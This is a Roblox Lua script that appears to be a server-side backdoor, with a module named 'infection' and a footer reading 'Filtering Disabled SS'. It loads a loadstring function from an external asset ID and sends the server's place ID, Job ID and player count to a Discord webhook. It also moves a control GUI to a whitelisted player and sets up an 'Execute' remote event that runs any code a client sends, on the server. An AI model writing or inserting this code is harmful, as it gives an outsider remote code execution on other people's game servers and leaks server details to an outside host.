local infection = {}

vloadstring = require(10714900252)

whitelist = {"Roblox"}

print("hello")

game.Players.PlayerAdded:Connect(function(plr)

	for i,v in pairs(whitelist) do
		if plr.Name == v then
			print("hi")
			script.MainGui.Parent = plr.PlayerGui
		end
	end
end)

local webhook = "" -- put your discord webhook here
local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local http = game:GetService("HttpService")
local players = game.Players:GetPlayers()
local maxplayers = game.Players.MaxPlayers

local function getTime()
	local date = os.date("*t")
	return ("%02d:%02d"):format(((date.hour % 24) - 1) % 12 + 1, date.min)
end

local data = {
	["embeds"] = {{
		["title"] = "Server Started!",
		["url"] = "https://roblox.com/games/" .. game.PlaceId,
		["description"] = "**Game Name:** ".. name.Name.."\n**Players:** ".. #players.."/"..maxplayers.."\n**Game Id:** ".. game.PlaceId.."\n**Game Version:** ".. game.PlaceVersion.."\n**Job Id:** "..game.JobId,
		["image"] = {
			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png"
		},
		["footer"] = {
			["icon_url"] = "https://media.discordapp.net/attachments/905508790307282977/1003946458833240155/THE_ENTIRE_SHREK_MOVIE.gif", -- delete this line if u dont want an icon 
			["text"] = "Filtering Disabled SS • Today at "..getTime(),
		},
		["color"] = 808080,

	}}
}



local encode = http:JSONEncode(data) 
http:PostAsync(webhook,encode)

print("Success!")

script.Output.Parent = game.ServerScriptService
script.Execute.Parent = game.ReplicatedStorage

wait(5)

game.ReplicatedStorage.Execute.OnServerEvent:Connect(function(plr, code)
	print(code)
	coolgui21 = vloadstring(code)
	coolgui21()
end)

return infection
